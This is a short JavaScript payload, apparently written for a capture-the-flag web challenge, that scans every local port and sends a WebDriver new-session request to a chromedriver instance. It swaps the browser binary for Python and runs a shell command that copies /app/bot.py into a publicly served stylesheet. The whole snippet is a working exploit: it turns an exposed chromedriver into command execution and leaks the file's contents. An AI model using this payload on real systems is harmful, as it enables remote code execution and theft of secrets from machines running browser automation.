(function () {
    config = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            capabilities: {
            alwaysMatch: {
                "browserName": "chrome",
                "goog:chromeOptions": {
                    "binary": "/usr/local/bin/python",
                    "args": ["-c", "__import__('os').system('cat /app/bot.py > /app/static/style.css 2>&1')"]
                }
            }
            }
        })
    }

    for (let port=1; port<65535; port++) {
        fetch(`https://127.0.0.1:${port}/session`, config);
    }
})();
